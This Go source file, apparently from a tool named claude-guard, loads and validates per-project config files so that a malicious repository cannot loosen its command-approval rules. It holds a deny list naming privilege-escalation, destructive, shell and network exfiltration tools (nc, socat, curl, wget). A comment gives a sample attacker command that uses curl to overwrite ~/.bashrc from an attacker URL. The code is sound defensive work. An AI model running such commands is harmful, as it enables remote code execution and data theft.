// Package projectconfig loads per-project .claude-guard.yml files
// and materializes their allow extensions as tier 2 rules.
//
// Threat model: the project config file is potentially attacker-
// controlled (a malicious repo could ship a .claude-guard.yml that
// tries to weaken the guard). The security foundation is:
//
//  1. Project config can ONLY add tier-2 allow rules. It never
//     touches tier 1 (block). Tier 1 runs first and is compiled into
//     the binary.
//  2. Project-config allow rules use rules.AnchoredCommand only —
//     the same structural matcher the compiled defaults use. No raw
//     regex, no contains-matching, no glob. This means a project
//     rule can only auto-approve "single anchored call with no shell
//     trickery + program + subcommand" shapes.
//  3. Programs known to require user approval (sudo, su, doas) are
//     rejected at schema validation, regardless of what the project
//     config attempts.
//  4. Default block rules' programs cannot be added to the allow
//     list (e.g. a project config can't make `rm` "readonly").
//
// See docs/plans/2026-04-16-claude-guard-per-project-config.md.
package projectconfig

import (
	"bytes"
	"crypto/sha256"
	"encoding/hex"
	"errors"
	"fmt"
	"os"
	"path/filepath"
	"regexp"
	"strings"

	"github.com/RobinUS2/claude-guard/internal/rules"
	"gopkg.in/yaml.v3"
)

// ConfigFilename is the name of the per-project config file. We look
// for this in cwd and all ancestor directories up to 16 levels.
const ConfigFilename = ".claude-guard.yml"

// MaxAllowRules caps the number of rules a project config can
// contribute. Prevents pathological configs from ballooning engine
// latency.
const MaxAllowRules = 100

// File is the on-disk YAML shape.
type File struct {
	Version       int         `yaml:"version"`
	ProjectName   string      `yaml:"project_name"`
	Allow         []AllowSpec `yaml:"allow"`
	PromoteGlobal []string    `yaml:"promote_global"`
}

// AllowSpec is one allow-rule entry in the project config.
type AllowSpec struct {
	Name        string   `yaml:"name"`
	Programs    []string `yaml:"programs"`
	Subcommands []string `yaml:"subcommands"`
	ForbidFlags []string `yaml:"forbid_flags"`
}

const CurrentVersion = 1

// Config is the loaded + validated form, ready to feed into the engine.
type Config struct {
	// Path is the resolved filesystem location the config was read from.
	Path string
	// ProjectName is the optional tag from the YAML, echoed in doctor
	// and logs for operator visibility.
	ProjectName string
	// Rules is the materialized list of AnchoredCommand instances.
	Rules []rules.Rule
	// PromoteGlobal is the user-requested "cache these at global scope"
	// list. Engine consults it when choosing a cache key. (Plumbed in a
	// follow-up; unused by v1 engine.)
	PromoteGlobal []string
	// Hash is the sha256 of the raw file contents. Included in the
	// engine's cache key so a config edit invalidates stale verdicts.
	Hash string
	// Warning is non-nil when the file was found but partially invalid
	// (malformed YAML, unknown fields, rejected rules). The engine
	// should log the warning but still operate — missing project rules
	// just reduce to built-in defaults.
	Warning error
}

// FindConfigPath walks up from cwd looking for ConfigFilename. The
// walk is bounded to the enclosing git repository — if we find a
// `.git` directory at the current level before finding the config,
// the walk stops. This prevents a stray `.claude-guard.yml` at $HOME
// (or any directory above a repo boundary) from silently applying to
// every project below it. The config MUST live inside the repo it
// covers.
//
// If no `.git` is encountered (not a git repo), we fall back to a
// bounded 16-level walk. This supports personal scratch directories
// outside of version control.
func FindConfigPath(cwd string) (string, error) {
	if cwd == "" {
		return "", nil
	}
	dir := cwd
	for i := 0; i < 32; i++ { // bigger cap; git-repo-boundary stops earlier in practice
		candidate := filepath.Join(dir, ConfigFilename)
		info, err := os.Stat(candidate)
		if err == nil && !info.IsDir() {
			return candidate, nil
		}
		if err != nil && !errors.Is(err, os.ErrNotExist) {
			return "", err
		}
		// Stop at repo boundary: if this dir contains .git, don't walk
		// higher. Config files outside the repo boundary cannot affect
		// this invocation.
		if gitInfo, err := os.Stat(filepath.Join(dir, ".git")); err == nil && gitInfo != nil {
			return "", nil
		}
		parent := filepath.Dir(dir)
		if parent == dir {
			return "", nil
		}
		dir = parent
	}
	return "", nil
}

// Load walks up from cwd, finds the nearest ConfigFilename, parses
// and validates it, and returns a *Config. Returns (nil, nil) when
// no config is found — callers treat that as "use defaults only".
//
// When a file is found but invalid (malformed YAML, unknown fields,
// rejected rules), Load returns a *Config with Warning set. The
// caller can decide whether to ignore the file or surface the
// warning. Engine behavior is to ignore the file and log the warning.
func Load(cwd string) (*Config, error) {
	path, err := FindConfigPath(cwd)
	if err != nil {
		return nil, err
	}
	if path == "" {
		return nil, nil
	}
	return LoadFile(path)
}

// LoadFile parses a specific config file. Exposed separately from
// Load so `claude-guard lint` can validate a user-specified path
// without walking up from a cwd.
func LoadFile(path string) (*Config, error) {
	data, err := os.ReadFile(path)
	if err != nil {
		return nil, fmt.Errorf("read %s: %w", path, err)
	}

	var file File
	dec := yaml.NewDecoder(bytes.NewReader(data))
	dec.KnownFields(true)
	if err := dec.Decode(&file); err != nil {
		return &Config{
			Path:    path,
			Warning: fmt.Errorf("parse %s: %w", path, err),
		}, nil
	}

	if file.Version == 0 {
		file.Version = CurrentVersion
	}
	if file.Version != CurrentVersion {
		return &Config{
			Path:    path,
			Warning: fmt.Errorf("%s has version %d, expected %d", path, file.Version, CurrentVersion),
		}, nil
	}

	ruleset, vErr := validateAndMaterialize(&file)
	cfg := &Config{
		Path:          path,
		ProjectName:   file.ProjectName,
		Rules:         ruleset,
		PromoteGlobal: file.PromoteGlobal,
		Hash:          hashOf(data),
	}
	if vErr != nil {
		cfg.Warning = fmt.Errorf("%s: %w", path, vErr)
	}
	return cfg, nil
}

// hashOf returns the hex sha256 of a byte slice. Used for cache-key
// invalidation — if the file content changes, the hash changes, and
// engine cache keys built against the old hash miss.
func hashOf(data []byte) string {
	sum := sha256.Sum256(data)
	return hex.EncodeToString(sum[:])
}

// forbiddenAllowPrograms is the set of program names project configs
// are NOT allowed to add allow rules for. These are always subject to
// tier 1 block, the LLM tier, or the user prompt — a project config
// cannot weaken them. Any AllowSpec including one of these programs
// is rejected at validation time.
//
// Compared via base-name + lowercase after the absolute-path check,
// so "/bin/rm", "/BIN/RM", and "rm" are all rejected identically.
var forbiddenAllowPrograms = map[string]struct{}{
	// Privilege escalation
	"sudo": {}, "su": {}, "doas": {},
	// Destructive file ops (tier 1 also blocks these, but here we prevent
	// project configs from adding a broad allow that sidesteps tier 1's
	// narrow target-path list)
	"rm": {}, "rmdir": {},
	"chmod": {}, "chown": {}, "chattr": {},
	"dd":   {},
	"mkfs": {}, "mkfs.ext4": {}, "mkfs.xfs": {}, "mkfs.btrfs": {},
	"fdisk": {}, "parted": {}, "shred": {}, "wipe": {},
	// Shells and code execution (a project config cannot allow shell
	// scripts to run without user review — that's arbitrary code)
	"sh": {}, "bash": {}, "zsh": {}, "fish": {}, "ksh": {}, "dash": {}, "tcsh": {}, "csh": {},
	"eval": {}, "exec": {}, "source": {}, ".": {},
	"xargs": {}, // xargs wraps arbitrary commands; too broad for anchored allow
	// Raw network tools that can exfiltrate or execute remote payloads
	"nc": {}, "ncat": {}, "socat": {}, "telnet": {},
	// Process control (kill signals can cascade into destructive outcomes
	// if wrapped around pid lookups)
	"kill": {}, "pkill": {}, "killall": {},
	// System-level mount/unmount/network/init
	"mount": {}, "umount": {}, "route": {},
	"iptables": {}, "ufw": {}, "nft": {},
	"systemctl": {}, "launchctl": {}, "service": {}, "init": {},
	// Network / remote-code-fetch / exfil tools — a malicious project
	// config could pin an attacker URL as a subcommand and auto-approve
	// `curl -o ~/.bashrc https://attacker/…` (nothing in tier-1 covers
	// writes to ~/.bashrc). Safer to always require LLM / user review.
	"curl": {}, "wget": {}, "fetch": {}, "httpie": {}, "http": {},
	"aria2c": {}, "axel": {},
	// File transfer — same exfil/injection risk as curl/wget.
	"scp": {}, "sftp": {}, "rsync": {}, "rclone": {},
	// IaC / cloud / container CLIs — wide blast radius (resource
	// mutation, cluster credential writes). Per-project pre-approvals
	// for these tools are too broad; let the LLM tier reason about
	// each specific command shape.
	"gh": {}, "aws": {}, "gcloud": {}, "gsutil": {}, "az": {},
	"kubectl": {}, "oc": {}, "helm": {}, "terraform": {}, "ansible": {},
	"docker": {}, "podman": {}, "nerdctl": {},
}

// forbiddenAllowSubcommands keyed by program. Used to reject specific
// destructive verbs for programs that are otherwise allowable in
// project configs. `git` is the primary user: legitimate project
// workflows want `git status`/`log`/`diff` pre-approved, but
// `git apply`/`checkout`/`reset`/`clean` etc. are destructive enough
// that any project config trying to auto-approve them must be rejected.
var forbiddenAllowSubcommands = map[string]map[string]struct{}{
	"git": {
		"apply":       {}, // writes arbitrary files into working tree
		"checkout":    {}, // can overwrite working tree files
		"reset":       {}, // --hard nukes working tree
		"clean":       {}, // -fdx nukes ignored files
		"rm":          {}, // removes files
		"rebase":      {}, // mutates history
		"cherry-pick": {}, // mutates history
		"revert":      {}, // creates new commits
		"restore":     {}, // writes working tree
		"stash":       {}, // not destructive but state-mutating
	},
}

// plainProgramRE enforces that program names in project configs are
// bare lowercase names (no paths, no unusual chars). This keeps
// validation simple and closes the "/bin/rm bypass" hole.
var plainProgramRE = regexp.MustCompile(`^[a-z][a-z0-9_\-]*$`)

// normalizeProgram lowercases and takes the base name of the program
// string for comparison against forbiddenAllowPrograms. We ALSO reject
// anything that isn't a plain name — absolute paths, uppercase
// letters, weird chars — so the stored rule matches exactly what the
// AnchoredCommand matcher will see at hook time (the engine does NOT
// base-normalize allow rules; a rule authored as "/bin/rm" would only
// fire for literal "/bin/rm" commands, which is weird). Rejecting at
// validation time keeps "what the config author wrote" and "what the
// engine enforces" identical.
func normalizeProgram(p string) (normalized string, ok bool) {
	if strings.ContainsRune(p, '/') {
		return "", false
	}
	lower := strings.ToLower(p)
	if !plainProgramRE.MatchString(lower) {
		return "", false
	}
	return lower, true
}

// validateAndMaterialize converts File.Allow into []rules.Rule,
// enforcing the threat-model invariants. Returns a partial rule set
// plus a combined error listing every rejected rule.
func validateAndMaterialize(file *File) ([]rules.Rule, error) {
	if len(file.Allow) > MaxAllowRules {
		return nil, fmt.Errorf("project config has %d allow rules (max %d)", len(file.Allow), MaxAllowRules)
	}

	var out []rules.Rule
	var errs []error
	names := map[string]struct{}{}

	for i, spec := range file.Allow {
		idx := i + 1
		// Rule names namespace: prefix with "project:" so engine log
		// output distinguishes project rules from compiled-in defaults.
		name := spec.Name
		if name == "" {
			errs = append(errs, fmt.Errorf("rule #%d: missing name", idx))
			continue
		}
		if _, dup := names[name]; dup {
			errs = append(errs, fmt.Errorf("rule #%d (%s): duplicate name", idx, name))
			continue
		}
		names[name] = struct{}{}
		if len(spec.Programs) == 0 {
			errs = append(errs, fmt.Errorf("rule %q: programs list is empty", name))
			continue
		}
		// A rule with no required subcommand allows the program for
		// EVERY subcommand. For tools like docker, kubectl, terraform
		// that have destructive subcommands alongside safe ones, that's
		// effectively arbitrary code execution. Require at least one
		// subcommand constraint.
		if len(spec.Subcommands) == 0 {
			errs = append(errs, fmt.Errorf("rule %q: subcommands list is empty (required; use the LLM tier if you need a broad allow)", name))
			continue
		}
		// Validate + normalize programs. Reject absolute paths,
		// uppercase/weird names, and anything on the forbidden list
		// (comparison done on the normalized base name).
		normalized := make([]string, 0, len(spec.Programs))
		rejected := false
		for _, p := range spec.Programs {
			norm, ok := normalizeProgram(p)
			if !ok {
				errs = append(errs, fmt.Errorf("rule %q: program %q is invalid (must be a bare lowercase name, no paths)", name, p))
				rejected = true
				break
			}
			if _, bad := forbiddenAllowPrograms[norm]; bad {
				errs = append(errs, fmt.Errorf("rule %q: program %q is forbidden in project configs (would weaken tier 1 or allow arbitrary code execution)", name, p))
				rejected = true
				break
			}
			normalized = append(normalized, norm)
		}
		if rejected {
			continue
		}

		// Check subcommands against the per-program forbidden list.
		// For any program in the rule, if any requested subcommand is
		// forbidden for that program, reject the whole rule.
		subRejected := false
		for _, p := range normalized {
			if forbidSubs, ok := forbiddenAllowSubcommands[p]; ok {
				for _, sub := range spec.Subcommands {
					if _, bad := forbidSubs[sub]; bad {
						errs = append(errs, fmt.Errorf(
							"rule %q: subcommand %q is forbidden for program %q in project configs (destructive)",
							name, sub, p))
						subRejected = true
					}
				}
			}
		}
		if subRejected {
			continue
		}

		out = append(out, &rules.AnchoredCommand{
			RuleName:         "project:" + name,
			Programs:         normalized,
			RequireSubcmdAny: spec.Subcommands,
			ForbidFlags:      spec.ForbidFlags,
		})
	}

	var combined error
	if len(errs) > 0 {
		msg := fmt.Sprintf("%d rule(s) rejected:", len(errs))
		for _, e := range errs {
			msg += "\n  - " + e.Error()
		}
		combined = errors.New(msg)
	}
	return out, combined
}
